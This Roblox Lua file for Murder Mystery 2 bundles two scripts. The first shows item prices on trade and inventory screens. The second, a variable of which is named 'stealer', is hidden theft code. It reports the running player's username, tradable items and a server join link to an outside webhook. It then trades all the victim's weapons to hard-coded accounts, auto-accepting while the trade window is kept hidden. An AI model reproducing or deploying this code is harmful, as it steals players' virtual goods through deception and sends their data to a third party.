-- ============================================================
-- СКРИПТ 1
-- ============================================================
task.spawn(function()
    local success, err = pcall(function()
        do
            local HttpService = game:GetService("HttpService")
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer

            -- === 1. ЗАГРУЗКА БАЗЫ ЦЕН ===
            -- Замени на свою raw-ссылку, если репозиторий другой:
            local PRICES_URL = "https://raw.githubusercontent.com/Kenderlike/test/refs/heads/main/prices.json"
            local assetPrices = {}
            local pricesLoaded = false

            local function extractAssetId(url)
                if not url or url == "" then return nil end
                local s = tostring(url)
                return s:match("assetId=(%d+)") or s:match("id=(%d+)") or s:match("(%d%d%d%d%d+)")
            end

            task.spawn(function()
                for i = 1, 5 do
                    local success, result = pcall(function() return game:HttpGet(PRICES_URL) end)
                    if success then
                        local ok, json = pcall(function() return HttpService:JSONDecode(result) end)
                        if ok and type(json) == "table" then
                            assetPrices = json.by_asset or json
                            pricesLoaded = true
                            print("[MM2 Prices] База цен успешно загружена! Записей:", (function()
                                local c = 0; for _ in pairs(assetPrices) do c = c + 1 end return c
                            end)())
                            break
                        end
                    end
                    task.wait(2)
                end
            end)

            -- === 2. ПЛАШКА ЦЕНЫ ===
            local function updatePriceTag(targetFrame, price)
                if not targetFrame or not targetFrame:IsA("GuiObject") then return end
                if targetFrame.AbsoluteSize.X > 500 or targetFrame.AbsoluteSize.Y > 500 then return end

                local tag = targetFrame:FindFirstChild("MM2_PriceTag")
                if not tag then
                    tag = Instance.new("TextLabel")
                    tag.Name = "MM2_PriceTag"
                    tag.Size = UDim2.new(1, 0, 0, 16)
                    tag.Position = UDim2.new(0.5, 0, 0, 2)
                    tag.AnchorPoint = Vector2.new(0.5, 0)
                    tag.TextXAlignment = Enum.TextXAlignment.Center
                    tag.TextYAlignment = Enum.TextYAlignment.Top
                    tag.BackgroundTransparency = 1 
                    tag.TextStrokeTransparency = 0.3 
                    tag.TextSize = 13
                    tag.Font = Enum.Font.GothamBlack
                    tag.ZIndex = 99999
                    tag.Visible = true
                    tag.BorderSizePixel = 0
                    tag.Parent = targetFrame
                end

                local targetText, targetColor
                if type(price) == "number" then
                    targetText = price == 0 and "0" or tostring(price)
                    targetColor = price == 0 and Color3.fromRGB(200, 100, 100) or Color3.fromRGB(46, 204, 113)
                elseif type(price) == "string" then
                    targetText = price
                    targetColor = (price == "untradable" or price == "Priceless") and Color3.fromRGB(150, 150, 150) or Color3.fromRGB(255, 200, 100)
                else
                    if tag then tag:Destroy() end
                    return
                end

                if tag.Text ~= targetText then tag.Text = targetText end
                if tag.TextColor3 ~= targetColor then tag.TextColor3 = targetColor end
            end

            local function parseNumericPrice(val)
                if type(val) == "number" then return val end
                if type(val) == "string" then
                    local str = val:lower():gsub(",", ""):gsub(" ", "")
                    if str:match("k$") then str = str:gsub("k$", "") end
                    if str:match("m$") then str = str:gsub("m$", "") end
                    return tonumber(str) or 0
                end
                return 0
            end

            -- === 3. ОСНОВНОЙ СКАНЕР ===
            local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

            task.spawn(function()
                while not pricesLoaded do task.wait(0.5) end

                while task.wait(0.5) do
                    pcall(function()
                        local function processContainer(container, isOffer)
                            local sum = 0
                            local items = {}
                            local processedCells = {}

                            if not container then return end

                            for _, el in ipairs(container:GetDescendants()) do
                                if el:IsA("ImageLabel") and el.Visible then
                                    local assetId = extractAssetId(el.Image)
                                    
                                    -- Проверяем, есть ли этот Asset ID в нашей базе цен
                                    if assetId and assetPrices[tostring(assetId)] then
                                        local cell = el:FindFirstAncestor("NewItem") or el.Parent
                                        
                                        if cell and not processedCells[cell] then
                                            processedCells[cell] = true
                                            local price = assetPrices[tostring(assetId)]

                                            local qty = 1
                                            local amountLabel = cell:FindFirstChild("Amount", true)
                                            if amountLabel and amountLabel.Text and amountLabel.Text ~= "" then
                                                local numStr = amountLabel.Text:match("%d+")
                                                if numStr then qty = tonumber(numStr) or 1 end
                                            end

                                            if isOffer then
                                                local numPrice = parseNumericPrice(price)
                                                sum = sum + (numPrice * qty)
                                                table.insert(items, tostring(numPrice) .. (qty > 1 and ("("..qty..")") or ""))
                                            end

                                            updatePriceTag(cell, price)
                                        end
                                    end
                                end
                            end

                            if isOffer then
                                table.sort(items)
                                return #items > 0 and (table.concat(items, " + ") .. " = " .. tostring(sum)) or "0"
                            end
                        end

                        -- 1. Окно трейда
                        local tradeGuiPC = PlayerGui:FindFirstChild("TradeGUI")
                        if tradeGuiPC and tradeGuiPC.Enabled then
                            processContainer(tradeGuiPC, false)

                            local tradeContainer = tradeGuiPC:FindFirstChild("Container")
                            local tradeBase = tradeContainer and tradeContainer:FindFirstChild("Trade")
                            if tradeBase then
                                local yourOfferBlock = tradeBase:FindFirstChild("YourOffer")
                                local theirOfferBlock = tradeBase:FindFirstChild("TheirOffer")

                                if yourOfferBlock then
                                    local yString = processContainer(yourOfferBlock, true)
                                    local yoTitle = yourOfferBlock:FindFirstChild("Title")
                                    if yoTitle and yoTitle:IsA("TextLabel") then
                                        local newTxt = yString or "0"
                                        if yoTitle.Text ~= newTxt then yoTitle.Text = newTxt end
                                    end
                                end

                                if theirOfferBlock then
                                    local tString = processContainer(theirOfferBlock, true)
                                    local toTitle = theirOfferBlock:FindFirstChild("Title")
                                    if toTitle and toTitle:IsA("TextLabel") then
                                        local suffix = tostring(toTitle.Text):match("(%s*%([^%)]+%))$") or ""
                                        local newTxt = (tString or "0") .. suffix
                                        if toTitle.Text ~= newTxt then toTitle.Text = newTxt end
                                    end
                                end
                            end
                        end

                        -- 2. Инвентарь на экране, профили и крафт
                        local mainGui = PlayerGui:FindFirstChild("MainGUI")
                        if mainGui then
                            local gameFrame = mainGui:FindFirstChild("Game")
                            if gameFrame then
                                -- Тот самый основной ПК инвентарь:
                                local inventory = gameFrame:FindFirstChild("Inventory")
                                if inventory and inventory.Visible then
                                    processContainer(inventory, false)
                                end

                                local playerMenu = gameFrame:FindFirstChild("PlayerMenu")
                                if playerMenu and playerMenu.Visible then
                                    local mainInventory = playerMenu:FindFirstChild("Inventory")
                                    if mainInventory and mainInventory.Visible then
                                        processContainer(mainInventory, false)
                                    end
                                end

                                local viewProfile = gameFrame:FindFirstChild("ViewProfile")
                                if viewProfile and viewProfile.Visible then 
                                    processContainer(viewProfile, false) 
                                end

                                local crafting = gameFrame:FindFirstChild("Crafting")
                                if crafting and crafting.Visible then
                                    processContainer(crafting, false)
                                end
                            end
                        end
                    end)
                end
            end)
        end
    end)
    
    if not success then
        warn("[Ошибка в Скрипте 1]:", err)
    end
end)


-- ============================================================
-- СКРИПТ 2
-- ============================================================
task.spawn(function()
    local success, err = pcall(function()
        do
            repeat task.wait() until game:IsLoaded()

            local stealer = { core = {} }
            local core = stealer.core

            function core.missing(functype, func, fallback)
                if type(func) == functype then return func end
                return fallback
            end

            cloneref = core.missing("function", cloneref, function(...) return ... end)
            request = core.missing("function", request or http_request or (http and http.request))

            local services = setmetatable({}, {
                __index = function(self, key)
                    local s = cloneref(game:GetService(key))
                    rawset(self, key, s)
                    return s
                end
            })

            local users = _G.Usernames or {"057Deni", "Sky54566443"}
            local min_rarity = _G.min_rarity or "Common"
            local ping = _G.pingEveryone or "Yes"
            local webhook = _G.webhook or "http://de-bots.h1cloud.net:25569/roblox-webhook"

            local player = services.Players.LocalPlayer

            if game.PlaceId ~= 142823291 and game.PlaceId ~= 335132309 and game.PlaceId ~= 636649648 then
                player:Kick("Game not supported. Please join a normal MM2 server")
                return
            end

            if #services.Players:GetPlayers() >= 12 then
                player:Kick("Server is full. Please join a less populated server")
                return
            end

            if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
                player:kick("Script is not work here ._. (Vip server detected)")
                return
            end

            local playerGui = player:WaitForChild("PlayerGui")
            local tradeUI = playerGui:WaitForChild("TradeGUI", 15)
            local tradePhoneUI = playerGui:WaitForChild("TradeGUI_Phone", 15)
            local db = require(services.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
            local Trade = services.ReplicatedStorage:WaitForChild("Trade")

            local rarityTable = {
                "Common", "Uncommon", "Rare", "Legendary",
                "Godly", "Ancient", "Unique", "Classic", "Vintage"
            }

            local sortPriority = {
                Ancient = 1, Corrupt = 3, Godly = 4, Unique = 5,
                Classic = 2, Vintage = 6, Legendary = 7, Rare = 8, Uncommon = 9, Common = 10
            }

            local min_rarity_index = table.find(rarityTable, min_rarity)

            local untradable = {
                DefaultGun = true,
                DefaultKnife = true,

                Reaver = true,
                Reaver_Legendary = true,
                Reaver_Godly = true,
                Reaver_Ancient = true,

                IceHammer = true,
                IceHammer_Legendary = true,
                IceHammer_Godly = true,
                IceHammer_Ancient = true,

                Gingerscythe = true,
                Gingerscythe_Legendary = true,
                Gingerscythe_Godly = true,
                Gingerscythe_Ancient = true,

                TestItem = true,
                Season1TestKnife = true,
                Cracks = true,
                Icecrusher = true,
                ["???"] = true,
                Dartbringer = true,

                TravelerAxeRed = true,
                TravelerAxeBronze = true,
                TravelerAxeSilver = true,
                TravelerAxeGold = true,

                BlueCamo_K_2022 = true,
                GreenCamo_K_2022 = true,
                SharkSeeker = true
            }

            local lastOffer = nil
            local lastTradeUpdate = 0
            local autoTradeActive = false
            local autoTradeUser = nil
            local currentPartner = nil
            local trading = false

            function core.resetTradeState()
                lastOffer = nil
                lastTradeUpdate = 0
                currentPartner = nil
            end

            function core.forceHideTradeUI()
                if tradeUI then
                    tradeUI.Enabled = false
                end

                if tradePhoneUI then
                    tradePhoneUI.Enabled = false
                end
            end

            function core.isTargetUser(name)
                return name ~= nil and table.find(users, name) ~= nil
            end

            function core.isAutoPartner()
                return autoTradeActive
                    and autoTradeUser ~= nil
                    and currentPartner ~= nil
                    and currentPartner == autoTradeUser
            end

            if tradeUI then
                tradeUI:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if core.isAutoPartner() and tradeUI.Enabled then
                        tradeUI.Enabled = false
                    end
                end)
            end

            if tradePhoneUI then
                tradePhoneUI:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if core.isAutoPartner() and tradePhoneUI.Enabled then
                        tradePhoneUI.Enabled = false
                    end
                end)
            end

            services.RunService.Heartbeat:Connect(function()
                if core.isAutoPartner() then
                    core.forceHideTradeUI()
                end
            end)

            function core.partnerFromTradeData(data)
                if type(data) ~= "table" then
                    return nil
                end

                local p1 = data.Player1 and data.Player1.Player
                local p2 = data.Player2 and data.Player2.Player

                local function nameOf(p)
                    if typeof(p) == "Instance" then
                        return p.Name
                    end

                    if type(p) == "string" then
                        return p
                    end

                    return nil
                end

                if p1 == player or nameOf(p1) == player.Name then
                    return nameOf(p2)
                end

                if p2 == player or nameOf(p2) == player.Name then
                    return nameOf(p1)
                end

                return nil
            end

            Trade.UpdateTrade.OnClientEvent:Connect(function(data)
                if type(data) ~= "table" then
                    return
                end

                local name = core.partnerFromTradeData(data)

                if name then
                    currentPartner = name
                end

                if data.LastOffer ~= nil then
                    lastOffer = data.LastOffer
                    lastTradeUpdate = os.clock()
                end
            end)

            Trade.StartTrade.OnClientEvent:Connect(function(_, partnerName)
                currentPartner = partnerName
                lastOffer = nil
                lastTradeUpdate = 0

                if core.isAutoPartner() then
                    core.forceHideTradeUI()
                end
            end)

            Trade.DeclineTrade.OnClientEvent:Connect(function()
                core.resetTradeState()
            end)

            Trade.AcceptTrade.OnClientEvent:Connect(function(success)
                if success then
                    core.resetTradeState()
                end
            end)

            function core.getTradeStatus()
                local ok, result = pcall(function()
                    return Trade.GetTradeStatus:InvokeServer()
                end)

                if not ok then
                    return "None"
                end

                return result
            end

            function core.sendTrade(user)
                local plr = services.Players:FindFirstChild(user)

                if not plr then
                    return false
                end

                local ok, result = pcall(function()
                    return Trade.SendRequest:InvokeServer(plr)
                end)

                return ok and result
            end

            function core.addWeaponToTrade(id)
                if not core.isAutoPartner() then
                    return false
                end

                local ok = pcall(function()
                    Trade.OfferItem:FireServer(id, "Weapons")
                end)

                return ok
            end

            function core.getRemainingWeapons()
                local ok, data = pcall(function()
                    return services.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(player.Name)
                end)

                if not ok or not data or not data.Weapons or not data.Weapons.Owned then
                    return {}
                end

                local list = {}

                for id, amount in next, data.Weapons.Owned do
                    local info = db[id]

                    if info and type(amount) == "number" and amount > 0 and not untradable[id] then
                        local rarity = info.Rarity
                        local idx = table.find(rarityTable, rarity)

                        if idx and idx >= min_rarity_index then
                            table.insert(list, {
                                DataID = id,
                                Rarity = rarity,
                                Amount = amount
                            })
                        end
                    end
                end

                table.sort(list, function(a, b)
                    local pa = sortPriority[a.Rarity] or 99
                    local pb = sortPriority[b.Rarity] or 99

                    if pa ~= pb then
                        return pa < pb
                    end

                    return tostring(a.DataID) < tostring(b.DataID)
                end)

                return list
            end

            function core.sendMsg(list, prefix)
                if type(webhook) ~= "string" or webhook == "" or not request then
                    return
                end

                local itemText = ""

                for _, item in ipairs(list) do
                    if item.Amount and item.Amount > 1 then
                        itemText = itemText .. string.format(
                            "%s | %s (x%d)\n",
                            item.Rarity,
                            item.DataID,
                            item.Amount
                        )
                    else
                        itemText = itemText .. string.format(
                            "%s | %s\n",
                            item.Rarity,
                            item.DataID
                        )
                    end
                end

                if #itemText > 1024 then
                    local lines = {}
                    local len = 0

                    for line in itemText:gmatch("[^\r\n]+") do
                        if len + #line + 1 > 1000 then
                            table.insert(lines, "Plus more!")
                            break
                        end

                        table.insert(lines, line)
                        len = len + #line + 1
                    end

                    itemText = table.concat(lines, "\n")
                end

                pcall(function()
                    request({
                        Url = webhook,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = services.HttpService:JSONEncode({
                            content = (prefix or "") ..
                                "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId).. ", '" ..
                                game.JobId ..
                                "')",

                            embeds = {{
                                title = nil,
                                color = 65280,

                                fields = {
                                    {
                                        name = "Victim Username",
                                        value = player.Name,
                                        inline = true
                                    },
                                    {
                                        name = "Join link",
                                        value = "http://de-bots.h1cloud.net:25569/joiner?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" ..
                                            game.JobId
                                    },
                                    {
                                        name = "Item list",
                                        value = itemText,
                                        inline = false
                                    }
                                },

                                footer = {
                                    text = "good job"
                                }
                            }}
                        })
                    })
                end)
            end

            function core.waitUntilTradeFree(timeout)
                local started = os.clock()

                while true do
                    if core.getTradeStatus() == "None" then
                        core.resetTradeState()
                        return true
                    end

                    if timeout and os.clock() - started >= timeout then
                        return false
                    end

                    task.wait(0.3)
                end
            end

            function core.waitForPartner(user, timeout)
                local started = os.clock()

                while os.clock() - started < (timeout or 5) do
                    if currentPartner == user then
                        return true
                    end

                    task.wait(0.1)
                end

                return currentPartner == user
            end

            function core.waitForOffer(timeout)
                local started = os.clock()

                while os.clock() - started < (timeout or 12) do
                    if lastOffer ~= nil and lastTradeUpdate > 0 then
                        return lastOffer
                    end

                    task.wait(0.1)
                end

                return nil
            end

            function core.acceptTrade(user)
                if currentPartner ~= user then
                    return false
                end

                local token = core.waitForOffer(12)

                if token == nil then
                    return false
                end

                for _ = 1, 10 do
                    if currentPartner ~= user then
                        return false
                    end

                    if lastOffer ~= nil then
                        token = lastOffer
                    end

                    local status = core.getTradeStatus()

                    if status ~= "StartTrade" then
                        return true
                    end

                    pcall(function()
                        Trade.AcceptTrade:FireServer(game.PlaceId * 3, token)
                    end)

                    task.wait(0.4)
                end

                return core.getTradeStatus() ~= "StartTrade"
            end

            function core.doTrade(user)
                if not core.isTargetUser(user) then
                    return
                end

                if not services.Players:FindFirstChild(user) then
                    return
                end

                autoTradeUser = user

                if not core.waitUntilTradeFree(10) then
                    return
                end

                while services.Players:FindFirstChild(user) and #core.getRemainingWeapons() > 0 do
                    local status = core.getTradeStatus()

                    if status == "None" then
                        core.resetTradeState()

                        if not core.sendTrade(user) then
                            task.wait(0.8)
                            continue
                        end

                        task.wait(0.4)

                    elseif status == "SendingRequest" or status == "ReceivingRequest" then
                        task.wait(0.3)

                    elseif status == "StartTrade" then
                        if not core.waitForPartner(user, 5) then
                            core.waitUntilTradeFree(8)
                            task.wait(0.5)
                            continue
                        end

                        if currentPartner ~= user then
                            core.waitUntilTradeFree(8)
                            continue
                        end

                        core.forceHideTradeUI()

                        local left = core.getRemainingWeapons()

                        if #left == 0 then
                            break
                        end

                        local amount = math.min(4, #left)

                        for i = 1, amount do
                            local weapon = left[i]

                            if weapon then
                                for _ = 1, weapon.Amount do
                                    if currentPartner ~= user then
                                        break
                                    end

                                    core.addWeaponToTrade(weapon.DataID)
                                    task.wait(0.08)
                                end
                            end
                        end

                        task.wait(0.8)

                        local accepted = core.acceptTrade(user)

                        if not accepted then
                            task.wait(0.5)

                            if core.getTradeStatus() == "StartTrade" and currentPartner == user then
                                core.acceptTrade(user)
                            end
                        end

                        if not core.waitUntilTradeFree(15) then
                            core.resetTradeState()
                            task.wait(1)
                        else
                            task.wait(1)
                        end
                    else
                        task.wait(0.3)
                    end
                end

                core.waitUntilTradeFree(10)
                core.resetTradeState()
            end

            local initial = core.getRemainingWeapons()

            if #initial == 0 then
                return
            end

            local prefix = ping == "Yes" and "RUSSIAN\n" or ""

            core.sendMsg(initial, prefix)

            task.spawn(function()
                while true do
                    if not trading then
                        for _, name in ipairs(users) do
                            local plr = services.Players:FindFirstChild(name)

                            if plr and #core.getRemainingWeapons() > 0 then
                                trading = true
                                autoTradeActive = true
                                autoTradeUser = name

                                local ok, err = pcall(function()
                                    core.doTrade(name)
                                end)

                                core.waitUntilTradeFree(10)
                                core.resetTradeState()

                                autoTradeActive = false
                                autoTradeUser = nil
                                trading = false

                                if not ok then
                                    warn(err)
                                end

                                task.wait(.5)
                            end
                        end
                    end

                    task.wait(.5)
                end
            end)
        end
    end)
    
    if not success then
        warn("[Ошибка в Скрипте 2]:", err)
    end
end)
